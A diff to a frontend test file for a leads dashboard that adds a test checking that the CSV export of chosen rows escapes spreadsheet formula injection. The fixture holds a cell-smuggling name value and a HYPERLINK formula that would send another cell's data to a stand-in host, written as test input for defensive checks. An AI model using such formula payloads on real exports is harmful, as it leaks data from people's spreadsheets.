@@ -3,7 +3,8 @@
  * headers, paging, page size, quick filters, chips, the organization-wide cards and the columns.
  * The router's URL really changes; the list hook records what it was asked for.
  * Also the latest hearing's columns, filters and presets (#137) and the server export (#173),
- * the empty and failed list and the names of the row selection (#431).
+ * the empty and failed list and the names of the row selection (#431), and the CSV of the rows
+ * chosen, written in the browser with each cell safe for a spreadsheet (#996).
  */
 import LeadsPage from '@/app/[locale]/(dashboard)/leads/page';
 import { LEAD_LIST_PREFERENCES_KEY } from '@/hooks/use-lead-list-query';
@@ -161,6 +162,10 @@ vi.mock('@/lib/trpc/client', () => {
         export: {
           useMutation: () => ({ mutateAsync: exporter.mutateAsync, isPending: false }),
         },
+      },
+      // The create dialog mounts LeadForm, whose status field renders <FieldHelp> (Epic #780 P2)
+      fieldGlossary: {
+        getByKeys: { useQuery: () => ({ data: undefined, isLoading: false }) },
       },
     },
   };
@@ -671,5 +676,44 @@ describe('LeadsPage row selection names (#431)', () => {
       expect(screen.queryByRole('button', { name: '選択を解除' })).not.toBeInTheDocument()
     );
     expect(row()).not.toBeChecked();
+  });
+});
+
+describe('LeadsPage export of the rows chosen (#996)', () => {
+  /** The text of the file given to the link (jsdom's Blob has no text()) */
+  const readBlob = (blob: Blob) =>
+    new Promise<string>((resolve, reject) => {
+      const reader = new FileReader();
+      reader.onload = () => resolve(String(reader.result));
+      reader.onerror = () => reject(reader.error);
+      reader.readAsText(blob);
+    });
+
+  it('writes a cell from a public form so that it neither runs as a formula nor makes cells of its own', async () => {
+    const user = userEvent.setup();
+    const createObjectURL = vi.fn((_blob: Blob) => 'blob:x');
+    Object.assign(URL, { createObjectURL, revokeObjectURL: vi.fn() });
+    const click = vi.spyOn(HTMLAnchorElement.prototype, 'click').mockImplementation(() => {});
+    server.items = [
+      makeLead('a1', {
+        name: '架空 太郎","=1+1',
+        company: '=HYPERLINK("https://example.com/?d="&C2,"詳細")',
+      }),
+    ];
+    renderPage();
+    const grid = within(await table());
+
+    await user.click(grid.getByRole('checkbox', { name: 'すべて選択' }));
+    await user.click(await screen.findByRole('button', { name: '選択をエクスポート' }));
+    await user.click(await screen.findByRole('menuitem', { name: 'CSV' }));
+
+    await waitFor(() => expect(click).toHaveBeenCalled());
+    const [header, row] = (await readBlob(createObjectURL.mock.calls[0][0])).split('\n');
+    expect(header).toBe('Name,Email,Company,Phone,Status,Score,Source,Created At');
+    // The quotes doubled inside quotes, the formula after a quote mark: 8 cells, as many as the header
+    expect(row).toBe(
+      `"架空 太郎"",""=1+1",a1@example.jp,"'=HYPERLINK(""https://example.com/?d=""&C2,""詳細"")",,new,70,diagnostic,2026-10-11T01:00:00.000Z`
+    );
+    click.mockRestore();
   });
 });
